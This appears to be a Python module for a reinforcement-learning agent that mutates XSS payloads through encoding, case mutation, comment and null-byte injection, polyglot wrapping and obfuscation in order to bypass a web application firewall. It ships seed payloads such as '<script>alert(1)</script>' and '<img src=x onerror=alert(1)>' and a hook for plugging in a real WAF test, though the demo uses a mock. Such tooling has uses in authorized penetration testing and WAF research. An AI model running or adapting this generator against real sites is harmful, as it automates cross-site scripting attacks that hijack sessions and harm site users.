"""
Reinforcement Learning Engine for WAF Bypass
Learns optimal payload strategies through trial and error
Uses Q-Learning and Policy Gradient methods
"""

import numpy as np
import pickle
import random
from collections import defaultdict, deque
from typing import List, Dict, Tuple, Optional
import json
from datetime import datetime


class WAFEnvironment:
    """
    Simulates WAF interaction environment
    State: Current payload characteristics
    Action: Mutation/evasion technique to apply
    Reward: Success/failure of bypass
    """
    
    def __init__(self):
        # Define action space (evasion techniques)
        self.actions = [
            'url_encode',
            'html_encode',
            'unicode_encode',
            'case_mutation',
            'comment_injection',
            'null_byte_injection',
            'double_encode',
            'mixed_case',
            'whitespace_injection',
            'tag_confusion',
            'attribute_breaking',
            'polyglot_transform',
            'obfuscation',
            'encoding_chain',
            'context_breaking',
        ]
        
        self.action_to_idx = {a: i for i, a in enumerate(self.actions)}
        self.idx_to_action = {i: a for i, a in enumerate(self.actions)}
        
        # State features
        self.state_features = [
            'has_script_tag',
            'has_event_handler',
            'has_javascript_protocol',
            'length',
            'encoding_level',
            'special_char_count',
            'tag_count',
            'obfuscation_level',
        ]
    
    def get_state(self, payload: str) -> np.ndarray:
        """Extract state features from payload"""
        state = np.zeros(len(self.state_features))
        
        # Feature extraction
        payload_lower = payload.lower()
        state[0] = 1.0 if 'script' in payload_lower else 0.0
        state[1] = 1.0 if any(e in payload_lower for e in ['onload', 'onerror', 'onclick']) else 0.0
        state[2] = 1.0 if 'javascript:' in payload_lower else 0.0
        state[3] = min(len(payload) / 100.0, 1.0)  # Normalized length
        state[4] = min(payload.count('%') / 10.0, 1.0)  # Encoding indicators
        state[5] = min(sum(c in '<>"\'/=(){}[]' for c in payload) / 20.0, 1.0)
        state[6] = min(payload.count('<') / 5.0, 1.0)
        state[7] = min((payload.count('\\') + payload.count('&#')) / 10.0, 1.0)
        
        return state
    
    def apply_action(self, payload: str, action_idx: int) -> str:
        """Apply evasion technique to payload"""
        action = self.idx_to_action[action_idx]
        
        if action == 'url_encode':
            return ''.join(f'%{ord(c):02x}' if random.random() < 0.5 else c for c in payload)
        
        elif action == 'html_encode':
            return ''.join(f'&#{ord(c)};' if random.random() < 0.3 else c for c in payload)
        
        elif action == 'unicode_encode':
            return ''.join(f'\\u{ord(c):04x}' if random.random() < 0.3 else c for c in payload)
        
        elif action == 'case_mutation':
            return ''.join(c.swapcase() if c.isalpha() and random.random() < 0.5 else c for c in payload)
        
        elif action == 'comment_injection':
            parts = payload.split()
            return '<!---->'.join(parts) if parts else payload
        
        elif action == 'null_byte_injection':
            pos = random.randint(0, len(payload))
            return payload[:pos] + '\x00' + payload[pos:]
        
        elif action == 'double_encode':
            encoded = ''.join(f'%{ord(c):02x}' for c in payload)
            return ''.join(f'%{ord(c):02x}' for c in encoded)
        
        elif action == 'mixed_case':
            return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        
        elif action == 'whitespace_injection':
            chars = list(payload)
            for i in range(len(chars) - 1, 0, -1):
                if random.random() < 0.2:
                    chars.insert(i, random.choice([' ', '\t', '\n', '\r']))
            return ''.join(chars)
        
        elif action == 'tag_confusion':
            return payload.replace('<', '</**/>').replace('>', '/**/>') if '<' in payload else payload
        
        elif action == 'attribute_breaking':
            return payload.replace('=', '=/***/') if '=' in payload else payload
        
        elif action == 'polyglot_transform':
            return f'"><script>{payload}</script><"'
        
        elif action == 'obfuscation':
            if 'alert' in payload:
                return payload.replace('alert', 'self["ale"+"rt"]')
            return payload
        
        elif action == 'encoding_chain':
            # Chain multiple encodings
            temp = ''.join(f'%{ord(c):02x}' if random.random() < 0.3 else c for c in payload)
            return ''.join(f'&#{ord(c)};' if random.random() < 0.3 else c for c in temp)
        
        elif action == 'context_breaking':
            break_chars = ['"', "'", '>', '<', '`']
            break_char = random.choice(break_chars)
            return break_char + payload
        
        return payload


class ReinforcementLearner:
    """
    Q-Learning based RL agent for learning optimal WAF bypass strategies
    """
    
    def __init__(self, learning_rate=0.1, discount_factor=0.95, 
                 epsilon=1.0, epsilon_decay=0.995, epsilon_min=0.01):
        self.env = WAFEnvironment()
        self.lr = learning_rate
        self.gamma = discount_factor
        self.epsilon = epsilon
        self.epsilon_decay = epsilon_decay
        self.epsilon_min = epsilon_min
        
        # Q-table: state -> action -> Q-value
        self.q_table = defaultdict(lambda: np.zeros(len(self.env.actions)))
        
        # Experience replay buffer
        self.memory = deque(maxlen=10000)
        
        # Training statistics
        self.episode_rewards = []
        self.success_rate_history = []
        
        print(f"[RL] RL Agent initialized")
        print(f"   Action space: {len(self.env.actions)} techniques")
        print(f"   State space: {len(self.env.state_features)} features")
    
    def _state_to_key(self, state: np.ndarray) -> str:
        """Convert state array to hashable key"""
        # Discretize state for Q-table
        discretized = tuple(int(x * 10) for x in state)
        return str(discretized)
    
    def select_action(self, state: np.ndarray, training=True) -> int:
        """
        Epsilon-greedy action selection
        
        Args:
            state: Current state
            training: If True, use epsilon-greedy; if False, use greedy
        
        Returns:
            Action index
        """
        if training and random.random() < self.epsilon:
            # Explore: random action
            return random.randint(0, len(self.env.actions) - 1)
        else:
            # Exploit: best known action
            state_key = self._state_to_key(state)
            q_values = self.q_table[state_key]
            return int(np.argmax(q_values))
    
    def learn(self, state: np.ndarray, action: int, reward: float, 
              next_state: np.ndarray, done: bool):
        """
        Update Q-values using Q-learning update rule
        Q(s,a) = Q(s,a) + α * (r + γ * max(Q(s',a')) - Q(s,a))
        """
        state_key = self._state_to_key(state)
        next_state_key = self._state_to_key(next_state)
        
        # Current Q-value
        current_q = self.q_table[state_key][action]
        
        # Target Q-value
        if done:
            target_q = reward
        else:
            max_next_q = np.max(self.q_table[next_state_key])
            target_q = reward + self.gamma * max_next_q
        
        # Update Q-value
        self.q_table[state_key][action] += self.lr * (target_q - current_q)
        
        # Store experience
        self.memory.append((state, action, reward, next_state, done))
    
    def train_episode(self, initial_payload: str, max_steps=10, 
                     test_function=None) -> Tuple[float, List[str]]:
        """
        Train one episode
        
        Args:
            initial_payload: Starting payload
            max_steps: Maximum mutation steps
            test_function: Function to test if payload bypasses WAF
                          Should return (success: bool, details: dict)
        
        Returns:
            Total reward, list of payloads tried
        """
        current_payload = initial_payload
        total_reward = 0.0
        payloads_tried = [current_payload]
        
        for step in range(max_steps):
            # Get current state
            state = self.env.get_state(current_payload)
            
            # Select action
            action = self.select_action(state, training=True)
            
            # Apply action
            next_payload = self.env.apply_action(current_payload, action)
            payloads_tried.append(next_payload)
            
            # Test payload
            if test_function:
                success, details = test_function(next_payload)
            else:
                # Mock testing
                success = random.random() < 0.1  # 10% success rate
                details = {}
            
            # Calculate reward
            if success:
                reward = 10.0  # Big reward for successful bypass
                done = True
            else:
                # Small penalty for failure
                reward = -0.1
                # Bonus for payload improvements
                if len(next_payload) < len(current_payload):
                    reward += 0.05  # Reward for shorter payloads
                done = False
            
            # Get next state
            next_state = self.env.get_state(next_payload)
            
            # Learn from experience
            self.learn(state, action, reward, next_state, done)
            
            # Update
            total_reward += reward
            current_payload = next_payload
            
            if done:
                break
        
        # Decay epsilon
        if self.epsilon > self.epsilon_min:
            self.epsilon *= self.epsilon_decay
        
        self.episode_rewards.append(total_reward)
        
        return total_reward, payloads_tried
    
    def train(self, training_payloads: List[str], episodes=100, 
              max_steps=10, test_function=None):
        """
        Train agent on multiple episodes
        
        Args:
            training_payloads: List of seed payloads
            episodes: Number of training episodes
            max_steps: Max steps per episode
            test_function: Function to test payloads
        """
        print(f"[RL] Training RL Agent...")
        print(f"   Episodes: {episodes}")
        print(f"   Training payloads: {len(training_payloads)}")
        
        successes = 0
        
        for episode in range(episodes):
            # Select random seed payload
            seed = random.choice(training_payloads)
            
            # Train episode
            reward, payloads = self.train_episode(seed, max_steps, test_function)
            
            # Track success
            if reward > 5.0:  # Indicates successful bypass
                successes += 1
            
            # Log progress
            if (episode + 1) % 10 == 0:
                success_rate = successes / (episode + 1)
                self.success_rate_history.append(success_rate)
                avg_reward = np.mean(self.episode_rewards[-10:]) if len(self.episode_rewards) >= 10 else 0.0
                print(f"   Episode {episode+1}/{episodes} | "
                      f"Avg Reward: {avg_reward:.2f} | "
                      f"Success Rate: {success_rate:.1%} | "
                      f"Epsilon: {self.epsilon:.3f}")
        
        print(f"[RL] Training complete!")
        if episodes > 0:
            print(f"   Final success rate: {successes/episodes:.1%}")
        print(f"   Q-table size: {len(self.q_table)} states")
    
    def generate_optimal_payload(self, base_payload: str, max_steps=10) -> Tuple[str, List[str]]:
        """
        Generate optimal payload using learned policy (no exploration)
        
        Args:
            base_payload: Starting payload
            max_steps: Maximum optimization steps
        
        Returns:
            Optimized payload, sequence of transformations
        """
        current_payload = base_payload
        transformation_history = [f"0. Start: {base_payload}"]
        
        for step in range(max_steps):
            state = self.env.get_state(current_payload)
            action = self.select_action(state, training=False)  # Greedy
            
            next_payload = self.env.apply_action(current_payload, action)
            action_name = self.env.idx_to_action[action]
            
            transformation_history.append(
                f"{step+1}. {action_name}: {next_payload[:60]}..."
            )
            
            current_payload = next_payload
        
        return current_payload, transformation_history
    
    def get_best_actions(self, state: np.ndarray, top_k=3) -> List[Tuple[str, float]]:
        """
        Get top-k best actions for a given state
        
        Returns:
            List of (action_name, q_value) tuples
        """
        state_key = self._state_to_key(state)
        q_values = self.q_table[state_key]
        
        # Get top-k actions
        top_indices = np.argsort(q_values)[-top_k:][::-1]
        
        return [(self.env.idx_to_action[idx], q_values[idx]) 
                for idx in top_indices]
    
    def save_model(self, path='rl_xss_model.pkl'):
        """Save trained model"""
        model_data = {
            'q_table': dict(self.q_table),
            'epsilon': self.epsilon,
            'episode_rewards': self.episode_rewards,
            'success_rate_history': self.success_rate_history,
            'timestamp': datetime.now().isoformat()
        }
        
        with open(path, 'wb') as f:
            pickle.dump(model_data, f)
        print(f"[RL] Model saved to {path}")
    
    def load_model(self, path='rl_xss_model.pkl'):
        """Load trained model"""
        with open(path, 'rb') as f:
            model_data = pickle.load(f)
        
        self.q_table = defaultdict(lambda: np.zeros(len(self.env.actions)), 
                                   model_data['q_table'])
        self.epsilon = model_data.get('epsilon', self.epsilon)
        self.episode_rewards = model_data.get('episode_rewards', [])
        self.success_rate_history = model_data.get('success_rate_history', [])
        
        print(f"[RL] Model loaded from {path}")
        print(f"   Trained states: {len(self.q_table)}")
        print(f"   Timestamp: {model_data.get('timestamp', 'Unknown')}")


# ==================== USAGE EXAMPLE ====================

if __name__ == "__main__":
    # Mock test function
    def mock_waf_test(payload: str) -> Tuple[bool, dict]:
        """Simulate WAF testing"""
        # Simple heuristic: encoded payloads more likely to bypass
        encoding_score = payload.count('%') + payload.count('&#') + payload.count('\\u')
        success = encoding_score > 5 or random.random() < 0.15
        return success, {'encoding_score': encoding_score}
    
    # Initialize RL agent
    agent = ReinforcementLearner(
        learning_rate=0.1,
        epsilon=1.0,
        epsilon_decay=0.99
    )
    
    # Training payloads
    seed_payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
    ]
    
    # Train agent
    agent.train(seed_payloads, episodes=100, max_steps=15, test_function=mock_waf_test)
    
    # Generate optimized payload
    print("\n[RL] Generating Optimized Payload:")
    optimized, history = agent.generate_optimal_payload('<script>alert(1)</script>')
    print("\nTransformation History:")
    for step in history:
        print(f"  {step}")
    print(f"\nFinal Payload: {optimized}")
    
    # Show best actions for a state
    state = agent.env.get_state('<script>alert(1)</script>')
    best_actions = agent.get_best_actions(state, top_k=5)
    print("\n[RL] Top 5 Actions for this state:")
    for action, q_val in best_actions:
        print(f"  {action}: Q={q_val:.3f}")
